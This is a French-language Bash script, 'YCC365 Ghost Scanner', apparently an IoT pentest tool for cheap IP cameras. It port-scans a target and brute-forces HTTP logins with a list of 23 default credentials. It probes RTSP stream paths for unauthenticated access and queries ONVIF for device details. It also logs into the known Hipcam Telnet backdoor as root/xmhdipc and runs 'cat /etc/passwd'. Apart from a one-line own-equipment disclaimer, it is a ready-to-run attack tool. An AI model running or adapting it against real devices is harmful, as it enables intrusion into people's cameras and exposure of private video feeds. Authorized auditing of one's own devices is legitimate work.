#!/data/data/com.termux/files/usr/bin/bash
# ════════════════════════════════════════════════════════════════════
# 🏴‍☠️ YCC365 GHOST SCANNER v1.0.0 — Signé Ghost1o1
# ════════════════════════════════════════════════════════════════════
# Scanner d'audit caméras YCC365 / IPCAM / Hipcam SDK
# Usage: bash ycc365-ghost.sh [IP_CAMERA] [OPTIONS]
# ════════════════════════════════════════════════════════════════════

set -e
VERSION="1.0.0"
AUTHOR="Ghost1o1"

# ─── Palette Ghost1o1 ───
GOLD="\033[38;5;220m"
CYAN="\033[38;5;39m"
RED="\033[38;5;196m"
GREEN="\033[38;5;46m"
GRAY="\033[38;5;245m"
BOLD="\033[1m"
DIM="\033[2m"
RESET="\033[0m"

# ─── ASCII Banner ───
banner() {
    clear 2>/dev/null || true
    echo -e "${GOLD}${BOLD}"
    echo "    ▓██▓▒░       ░▒▓██▓                                         "
    echo "     ▓█▓▒░ ░▒▓██▓▒░ ░▒▓█    ╔══════════════════════════════════╗"
    echo "      █▒░ ░▓██▓▒░ ░▒▓█      ║  🏴‍☠️  YCC365 GHOST SCANNER  🏴‍☠️    ║"
    echo "      ▓█▒░ ░▒░░░░░ ░▒▓█      ║                                  ║"
    echo "       ▓█▒░░░░░░░░░░░▒▓█      ║  Signé Ghost1o1 — Pentest IoT   ║"
    echo "        █▒░░░░░░░░░░░▒█       ║  Version ${VERSION}                    ║"
    echo "        ▓█▒░░░░░░░░░▒▓█       ╚══════════════════════════════════╝"
    echo "         ▓██▒░░░░░▒██▓                                       "
    echo -e "          ░▒▓███▓▒░                                          ${RESET}"
    echo ""
}

# ─── Configuration des ports YCC365 ───
YCC365_PORTS=(34567 34599 9527 554 8000 8899 80 443 23 8080 8081 8443 5552 37777 5000)
ALL_PORTS=(34567 34599 9527 554 8000 8899 80 443 23 8080 8081 8443 5552 37777 5000)

# ─── Credentials par défaut (23) ───
DEFAULT_CREDS=(
    "admin:admin"
    "admin:12345"
    "admin:888888"
    "admin:666666"
    "admin:123"
    "admin:password"
    "admin:123456"
    "admin:111111"
    "admin:000000"
    "admin:999999"
    "admin:abc123"
    "admin:admin123"
    "user:user"
    "user:12345"
    "user:password"
    "root:root"
    "root:xmhdipc"
    "root:12345"
    "root:pass"
    "support:support"
    "service:service"
    "guest:guest"
    "operator:operator"
)

# ─── URLs RTSP connues ───
RTSP_PATHS=(
    "/onvif/streaming/channels/101"
    "/streaming/channels/101"
    "/11"
    "/12"
    "/live/ch00_0"
    "/live/main"
    "/live/sub"
    "/live/0/main"
    "/live/0/sub"
    "/user=admin&password=&channel=1&stream=0.sdp"
    "/av0_0"
    "/video/main"
    "/mpeg4"
    "/cam/realmonitor"
    "/0/usrnm:admin/0/usrpw:admin/0/1"
    "/Streaming/Channels/101"
    "/Streaming/Channels/1"
    "/Streaming/Channels/2"
    "/h264"
    "/h264/ch01/main/av_stream"
    "/trackID=1"
)

# ─── Vérification des outils ───
check_tools() {
    local missing=()
    command -v nc >/dev/null 2>&1 || missing+=("nc (ncat/netcat)")
    command -v curl >/dev/null 2>&1 || command -v wget >/dev/null 2>&1 || missing+=("curl/wget")

    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[!] Outils manquants : ${missing[*]}${RESET}"
        echo -e "${CYAN}[*] Installation Termux:${RESET}"
        echo -e "    pkg update && pkg install ncat curl python"
        return 1
    fi
    return 0
}

# ─── Banner section ───
section() {
    echo -e "\n${GOLD}${BOLD}═══ $1 ═══${RESET}"
}

# ─── Scan de port TCP ───
port_scan() {
    local target=$1
    local port=$2
    local timeout=2

    if timeout "$timeout" bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null; then
        echo -e "  ${GREEN}[OPEN]${RESET} $port"
        return 0
    fi
    return 1
}

# ─── Test RTSP ───
rtsp_check() {
    local target=$1
    local port=${2:-554}

    if ! timeout 2 bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null; then
        return 1
    fi

    echo -e "  ${CYAN}[*] Test RTSP sur port $port${RESET}"

    local rtsp_response=$(curl -s -m 5 -X DESCRIBE \
        "rtsp://$target:$port/" 2>/dev/null | head -50)

    if echo "$rtsp_response" | grep -qi "rtsp/"; then
        echo -e "  ${GREEN}[✓] RTSP ACTIF${RESET}"
        echo -e "  ${GRAY}Banner: $(echo "$rtsp_response" | grep -oE 'Server: [^\\r\\n]+' | head -1)${RESET}"

        # Test chemins d'URL communs
        for path in "${RTSP_PATHS[@]}"; do
            local code=$(curl -s -m 3 -o /dev/null -w "%{http_code}" \
                "rtsp://$target:$port$path" 2>/dev/null || echo "000")
            if [[ "$code" =~ ^(200|301|302)$ ]]; then
                echo -e "    ${GREEN}[ACCESSIBLE]${RESET} $path"
            fi
        done
        return 0
    fi
    return 1
}

# ─── Test credentials HTTP Basic Auth ───
http_auth_test() {
    local target=$1
    local port=$2
    local creds=$3
    local user=$(echo "$creds" | cut -d: -f1)
    local pass=$(echo "$creds" | cut -d: -f2)

    local code=$(curl -s -m 3 -o /dev/null -w "%{http_code}" \
        -u "$user:$pass" \
        "http://$target:$port/" 2>/dev/null || echo "000")

    if [[ "$code" == "200" || "$code" == "301" ]]; then
        echo -e "  ${GREEN}[VALID]${RESET} $user:$pass (HTTP $code)"
        return 0
    fi
    return 1
}

# ─── Détection backdoor Telnet ───
telnet_backdoor_check() {
    local target=$1
    local port=${2:-9527}

    echo -e "  ${CYAN}[*] Test backdoor Telnet port $port${RESET}"

    # Vérifier que le port est ouvert
    if ! timeout 2 bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null; then
        echo -e "  ${GRAY}[SKIP] Port $port fermé${RESET}"
        return 1
    fi

    # Tentative root/xmhdipc (Hipcam SDK)
    echo -e "  ${RED}[*] Tentative root/xmhdipc...${RESET}"
    (
        sleep 1
        echo "root"
        sleep 1
        echo "xmhdipc"
        sleep 1
        echo "cat /etc/passwd"
        sleep 1
    ) | timeout 5 nc $target $port > /tmp/ycc365_telnet.out 2>&1

    if [ -s /tmp/ycc365_telnet.out ]; then
        echo -e "  ${RED}${BOLD}[CRITICAL] BACKDOOR TELNET ACTIF!${RESET}"
        echo -e "  ${GRAY}Sortie: $(head -5 /tmp/ycc365_telnet.out)${RESET}"
        return 0
    fi
    return 1
}

# ─── ONVIF discovery ───
onvif_probe() {
    local target=$1
    local port=${2:-8899}

    if ! timeout 2 bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null; then
        return 1
    fi

    echo -e "  ${CYAN}[*] ONVIF probe sur port $port${RESET}"

    local probe=$(curl -s -m 5 -X POST \
        -H "Content-Type: application/soap+xml" \
        -d '<?xml version="1.0"?>
<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/>
  </Body>
</Envelope>' \
        "http://$target:$port/onvif/device_service" 2>/dev/null)

    if echo "$probe" | grep -qiE "(Manufacturer|Model|Serial|Firmware)"; then
        echo -e "  ${GREEN}[ONVIF]${RESET} Device répond sans auth"
        echo "$probe" | grep -oE '<(Manufacturer|Model|SerialNumber|FirmwareVersion)>[^<]+' | head -5 | \
            while read line; do echo -e "    ${GRAY}$line${RESET}"; done
        return 0
    fi
    return 1
}

# ─── Scan complet d'une cible ───
scan_target() {
    local target=$1

    section "🎯 CIBLE: $target"
    echo -e "${GRAY}[*] Démarrage scan complet...${RESET}"

    # Phase 1: Scan des ports
    section "📡 Phase 1/4 — Scan des Ports"
    echo -e "${CYAN}[*] Scan de ${#ALL_PORTS[@]} ports...${RESET}"
    local open_ports=()
    for port in "${ALL_PORTS[@]}"; do
        if timeout 1 bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null; then
            echo -e "  ${GREEN}[OPEN]${RESET} $port"
            open_ports+=($port)
        fi
    done

    if [ ${#open_ports[@]} -eq 0 ]; then
        echo -e "${RED}[!] Aucun port ouvert — cible inaccessible${RESET}"
        return 1
    fi

    # Phase 2: Bruteforce credentials
    section "🔑 Phase 2/4 — Bruteforce Credentials"
    echo -e "${CYAN}[*] Test de ${#DEFAULT_CREDS[@]} couples...${RESET}"
    local valid_creds=()

    for port in "${open_ports[@]}"; do
        if [[ $port == "80" || $port == "443" || $port == "8080" || $port == "8000" || $port == "34599" ]]; then
            echo -e "  ${GRAY}[*] Test sur port $port...${RESET}"
            for creds in "${DEFAULT_CREDS[@]}"; do
                if http_auth_test $target $port $creds; then
                    valid_creds+=("$creds@$port")
                fi
            done
        fi
    done

    # Phase 3: RTSP detection
    section "📹 Phase 3/4 — Détection RTSP"
    rtsp_check $target 554

    # Phase 4: Backdoor Telnet + ONVIF
    section "🚪 Phase 4/4 — Backdoor Telnet + ONVIF"
    for port in "${open_ports[@]}"; do
        if [[ $port == "9527" || $port == "23" ]]; then
            telnet_backdoor_check $target $port
        fi
        if [[ $port == "8899" || $port == "8000" ]]; then
            onvif_probe $target $port
        fi
    done

    # Résumé
    section "📊 RÉSUMÉ"
    echo -e "${GOLD}Cible${RESET}: $target"
    echo -e "${GOLD}Ports ouverts${RESET}: ${#open_ports[@]} (${open_ports[*]})"
    echo -e "${GOLD}Credentials valides${RESET}: ${#valid_creds[@]}"
    [ ${#valid_creds[@]} -gt 0 ] && echo -e "  ${GREEN}${valid_creds[*]}${RESET}"

    # Sauvegarde rapport
    local report="/tmp/ycc365_${target}_$(date +%Y%m%d_%H%M%S).txt"
    {
        echo "YCC365 GHOST SCANNER — Rapport"
        echo "Date: $(date)"
        echo "Cible: $target"
        echo "Ports ouverts: ${open_ports[*]}"
        echo "Credentials valides: ${valid_creds[*]}"
    } > "$report" 2>/dev/null

    echo -e "\n${CYAN}[*] Rapport sauvegardé: $report${RESET}"
}

# ─── Mode automatisé (réseau local) ───
auto_scan_network() {
    section "🔍 Scan réseau local"
    local network=$(ip route | grep default | awk '{print $3}' | sed 's/\.[0-9]*$/.0\/24/')

    if [ -z "$network" ]; then
        network="192.168.1.0/24"
    fi

    echo -e "${CYAN}[*] Réseau cible: $network${RESET}"

    # Note: nc/nmap scan du réseau
    echo -e "${GRAY}[!] Lance ping sweep + scan manuel${RESET}"
    echo -e "${GRAY}    ping -c1 \$network/*.X ou installer nmap${RESET}"
    echo -e "${GRAY}    nmap -sn \$network  # network discovery${RESET}"
}

# ─── Menu principal ───
main() {
    banner

    if ! check_tools; then
        exit 1
    fi

    section "📋 MENU PRINCIPAL"
    echo -e "  ${GOLD}[1]${RESET} Scanner une IP spécifique"
    echo -e "  ${GOLD}[2]${RESET} Découverte réseau local"
    echo -e "  ${GOLD}[3]${RESET} Afficher wordlist credentials"
    echo -e "  ${GOLD}[4]${RESET} Afficher paths RTSP"
    echo -e "  ${GOLD}[5]${RESET} Aide détaillée"
    echo -e "  ${GOLD}[q]${RESET} Quitter"
    echo ""

    read -p "Choix: " choice

    case "$choice" in
        1)
            read -p "IP cible (défaut: 192.168.1.100): " target
            target=${target:-192.168.1.100}
            scan_target "$target"
            ;;
        2)
            auto_scan_network
            ;;
        3)
            section "🔑 Wordlist Credentials (${#DEFAULT_CREDS[@]} entrées)"
            for cred in "${DEFAULT_CREDS[@]}"; do
                echo -e "  ${CYAN}$cred${RESET}"
            done
            ;;
        4)
            section "📹 Paths RTSP (${#RTSP_PATHS[@]} entrées)"
            for path in "${RTSP_PATHS[@]}"; do
                echo -e "  ${CYAN}rtsp://IP:554$path${RESET}"
            done
            ;;
        5)
            section "❓ AIDE"
            cat <<EOF
Ce scanner teste les vulnérabilités connues des caméras YCC365/Hipcam:

1. Ports par défaut exposés (16 ports)
2. Credentials faibles (23 wordlist)  
3. RTSP sans authentification (21 chemins)
4. Backdoor Telnet Hipcam port 9527
5. ONVIF device info disclosure
6. Bruteforce HTTP Basic Auth

Usage légal: UNIQUEMENT vos propres équipements.

Auteur: Ghost1o1 v${VERSION}
EOF
            ;;
        q|Q)
            echo -e "${GOLD}Au revoir! 🏴‍☠️${RESET}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Choix invalide${RESET}"
            ;;
    esac
}

main "$@"
